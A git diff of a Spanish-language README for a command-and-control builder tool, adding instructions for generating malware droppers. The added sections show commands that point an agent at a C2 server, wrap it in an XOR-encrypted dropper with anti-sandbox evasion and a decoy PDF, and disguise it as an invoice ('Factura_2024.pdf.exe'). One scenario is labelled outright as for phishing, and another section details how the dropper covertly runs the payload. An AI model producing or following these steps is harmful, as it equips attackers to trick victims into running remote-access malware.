@@ -1,4 +1,4 @@
-# Uso del Builder para Configurar Agentes
+# Uso del Builder para Configurar Agentes y Droppers
 
 ## 📋 Comandos Disponibles
 
@@ -30,7 +30,41 @@ Parchea un `agent.exe` pre-compilado con una nueva dirección IP/Puerto **sin ne
 - ⚠️ Solo puede cambiar IP/Puerto (máximo 64 caracteres)
 - ⚠️ No puede cambiar entre modo desarrollo/producción
 
-### 2. `build-agent` - Compilar desde Código Fuente
+### 2. `generate-dropper` - Generar Dropper Standalone (NUEVO)
+
+**Este es el método recomendado para crear droppers** sin necesidad de compilar.
+
+Genera un dropper que embebe un agente pre-compilado. El dropper extraerá y ejecutará el agente automáticamente.
+
+```bash
+# Windows
+.\builder.exe generate-dropper --agent mi_agente.exe --template dropper-rust\dropper.exe --output factura
+
+# Linux
+./builder generate-dropper --agent mi_agente.exe --template dropper-rust/dropper.exe --output factura
+```
+
+**Ventajas:**
+- ✅ No requiere Rust instalado
+- ✅ No requiere donut ni shellcode
+- ✅ Crea droppers en segundos
+- ✅ El agente se encripta con XOR automáticamente
+- ✅ Incluye anti-sandbox checks
+- ✅ Puede mostrar PDF de señuelo
+
+**Flujo típico:**
+```bash
+# 1. Parchear agente con IP correcta
+./builder patch-agent --input agent.exe --output mi_agente.exe --server 10.0.0.1:4444
+
+# 2. Generar dropper con el agente parcheado
+./builder generate-dropper --agent mi_agente.exe --template dropper.exe --output Factura_2024
+
+# 3. Renombrar a algo convincente
+mv Factura_2024.exe "Factura_2024.pdf.exe"
+```
+
+### 3. `build-agent` - Compilar desde Código Fuente
 
 **Solo para desarrolladores** con el código fuente completo y Rust instalado.
 
@@ -55,21 +89,41 @@ Compila un nuevo `agent.exe` desde cero con configuración específica.
 - ✅ Puede cambiar entre dev/prod
 - ✅ Puede modificar cualquier parámetro
 
+### 4. `build-dropper` - Compilar Dropper con Shellcode (Avanzado)
+
+**Para usuarios avanzados** que quieren usar shellcode personalizado.
+
+Requiere generar shellcode con donut y tener Rust instalado.
+
+```bash
+# Generar shellcode con donut
+donut.exe -i agent.exe -o shellcode.bin -f 1 -a 2
+
+# Compilar dropper
+./builder build-dropper --shellcode shellcode.bin --decoy documento.pdf --output dropper
+```
+
+**Requisitos:**
+- Rust + MinGW instalados
+- Donut para generar shellcode
+- PDF de señuelo (opcional)
+
 ## 🎯 ¿Cuál Usar?
 
-### Usa `patch-agent` si:
+### Para configurar agentes → `patch-agent`
 - Descargaste un release de GitHub
 - No tienes Rust instalado
 - Solo necesitas cambiar la IP/Puerto
-- Eres un usuario final, no desarrollador
-- Quieres configurar agentes rápidamente
 
-### Usa `build-agent` si:
+### Para crear droppers → `generate-dropper`
+- Quieres wrappear el agente en un dropper
+- No quieres lidiar con shellcode/donut
+- Necesitas un ejecutable que parezca un documento
+
+### Para desarrollo → `build-agent` / `build-dropper`
 - Tienes el código fuente completo
 - Tienes Rust + MinGW instalados
-- Necesitas cambiar modo dev/prod
-- Eres un desarrollador del proyecto
-- Quieres modificar features del agente
+- Necesitas personalizar features
 
 ## 📝 Ejemplos Prácticos
 
@@ -89,7 +143,28 @@ cd C2R2-v2
 # Listo! Ya tiene agente_empresa.exe configurado
 ```
 
-### Escenario 2: Desarrollador con código fuente
+### Escenario 2: Generar dropper para phishing
+
+```bash
+# 1. Parchear agente
+./builder patch-agent \
+    --input agent.exe \
+    --output agente_config.exe \
+    --server mi-c2-server.com:443
+
+# 2. Generar dropper
+./builder generate-dropper \
+    --agent agente_config.exe \
+    --template dropper.exe \
+    --output factura_enero
+
+# 3. El resultado es factura_enero.exe que:
+#    - Muestra un PDF de señuelo
+#    - Ejecuta el agente en segundo plano
+#    - Incluye evasión anti-sandbox
+```
+
+### Escenario 3: Desarrollador con código fuente
 
 ```bash
 # Clonar repositorio
@@ -119,6 +194,21 @@ cargo build --release --target x86_64-pc-windows-gnu --package builder
 
 4. Mantiene padding de nulls para permitir IPs de diferentes longitudes
 
+### Cómo Funciona el Dropper Generator
+
+1. Lee el dropper template pre-compilado
+2. Encripta el agente con XOR (clave aleatoria de 32 bytes)
+3. Anexa al final del dropper:
+   - Marcador de payload
+   - Clave XOR
+   - Agente encriptado
+   - Marcador de fin
+4. El dropper, al ejecutarse:
+   - Lee su propio ejecutable
+   - Extrae y desencripta el agente
+   - Lo escribe a temp con nombre aleatorio
+   - Lo ejecuta en segundo plano
+
 ### Limitaciones del Patching
 
 - **Longitud máxima:** 64 caracteres para `IP:PUERTO`
@@ -146,6 +236,14 @@ cargo build --release --target x86_64-pc-windows-gnu --package builder
 - Usa una IP más corta
 - Usa un dominio más corto
 - Reduce el número de puerto (ej: 4444 en lugar de 44444)
+
+### Error: "Template dropper no encontrado"
+
+**Causa:** El dropper template no existe en la ruta especificada.
+
+**Solución:**
+1. Descarga el release que incluye `dropper.exe`
+2. O compila el dropper: `cargo build --release --target x86_64-pc-windows-gnu -p dropper`
 
 ## 📚 Referencias
 
